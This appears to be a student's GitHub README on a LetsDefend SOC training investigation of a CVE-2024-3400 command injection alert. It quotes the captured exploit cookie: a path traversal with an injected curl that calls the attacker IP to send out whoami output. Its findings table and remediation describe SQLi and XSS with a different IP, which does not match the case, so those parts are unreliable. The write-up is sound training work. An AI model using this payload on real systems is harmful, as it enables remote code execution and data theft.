# SOC Project-(LetsDefend)
# 🔥 SOC Investigation: Web Attack 

## 🛡️ Overview
This project showcases my investigation of a **web attack** (CVE-2024-3400) using the Let’sDefend SOC platform. I analyzed **web logs, threat intelligence sources, and SIEM alerts** to detect and mitigate the threat.

## 📅 Incident Details
- **Incident Type:** Web Attack (Command Injection)
- **Source:** Let’sDefend SOC Platform
- **Objective:** Identify attack patterns, analyze logs, and recommend mitigation steps
- **Tools Used:** SIEM, VirusTotal, MITRE ATT&CK Framework, Palo Alto Network Security Advisories/Unit42 

## 🔍 Investigation Process

### 1. **Alert Review**
The investigation started with a web attack alert in the SIEM:
- **Source IP:** 144.172.79.92
- **Target:** 172.16.17.139/global-protect/login.esp
- **Alert Trigger Reason:** Characteristics exploit pattern Detected on Cookie and Request, indicative exploitation of the CVE-2024-3400.`
- **Attack Vector:** Command Injection (`./../../../`)

### 2. **Web Log & Endpoint Analysis**
Using **Firewall logs**, I identified:
- Suspicious GET/POST requests with Command Injection-like patterns: `SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl${IFS}144.172.79.92:4444?user=$(whoami)`
- Action was allowed and there was connection made indicated by "200" status
- Suspicous Process and command seen in Endpoint Security: '/usr/bin/python3 update.py'
- Image hash obtained and will be used for threat intelligence: 3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac

  <img width="300" alt="image" src="https://github.com/user-attachments/assets/c6045343-e769-4945-afd0-47275cc9e65d" />
  <img width="301" alt="image" src="https://github.com/user-attachments/assets/69cbeab2-ee79-4a45-9f4c-2e3a0b75cd07" />
  <img width="479" alt="image" src="https://github.com/user-attachments/assets/2fee43d2-bc82-4789-9e92-df92e5f0828e" />
  <img width="624" alt="image" src="https://github.com/user-attachments/assets/9c8a7baa-81ed-4827-ac90-f10945563345" />



### 3. **Threat Intelligence & Attack Mapping**
- **Checked malicious IP and hash image reputation** using **Virus Total**
- **Researched exploitation activity & reports ** using **https://unit42.paloaltonetworks.com/cve-2024-3400/**
- **Mapped attacker behavior** to **MITRE ATT&CK framework**

  <img width="851" alt="image" src="https://github.com/user-attachments/assets/affca3ac-71cb-4f7f-8859-847d575d256e" />
  <img width="844" alt="image" src="https://github.com/user-attachments/assets/5eaadf10-94ad-4acb-8988-03bbaa2c6a54" />



### 4. **Findings & MITRE ATT&CK Mapping**
| **Indicator**       | **Threat Source** | **MITRE ATT&CK TTP** |
|--------------------|-----------------|------------------|
| `' OR 1=1 --` (SQLi) | Web Logs Analysis | T1190 - Exploit Public-Facing App |
| `203.0.113.45` (Attacker IP) | AbuseIPDB: Malicious | T1071 - C2 Communication |
| `XSS Payload in URL` | Web Logs & Analysis | T1059.007 - JavaScript Execution |

## 🚀 Remediation & Lessons Learned
- **WAF Implementation** – Enable Web Application Firewall (WAF) to filter SQLi & XSS payloads
- **Input Validation** – Enforce strict input sanitization
- **Monitoring & Alerts** – Set up alerts for repeated unusual web requests

## 💡 Key Takeaways
✔ Improved log analysis & SIEM correlation skills  
✔ Hands-on experience with web attack detection  
✔ Familiarity with **Burp Suite, Wireshark, and OSINT tools**  

## 🌟 Screenshots
![Web Attack Alert in SIEM](screenshots/web_attack_alert.png)

## 📁 Project Structure
```
📂 SOC-Investigation-WebAttack
│── 📂 logs/              # Web server logs
│── 📂 reports/           # Investigation reports
│── 📂 screenshots/       # Evidence and analysis
│── 📄 README.md          # Project documentation
│── 📄 IOC_List.txt        # Indicators of compromise
│── 📄 .gitignore         # Ignore unnecessary files
```

## 📈 References
- [Let’sDefend SOC Platform](https://letsdefend.io/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Burp Suite](https://portswigger.net/burp)

---

### 🛠️ How to Use This Repository
1. Clone the repository:
   ```bash
   git clone https://github.com/yourusername/SOC-Investigation-WebAttack.git
   cd SOC-Investigation-WebAttack
   ```
2. Review logs and findings in `logs/` and `reports/` folders.
3. Analyze `IOC_List.txt` for threat intelligence insights.
4. Use the findings as a reference for future SOC investigations.

---

### 🎨 Contributions & License
This project is for educational purposes. Feel free to contribute! Licensed under [MIT License](LICENSE).
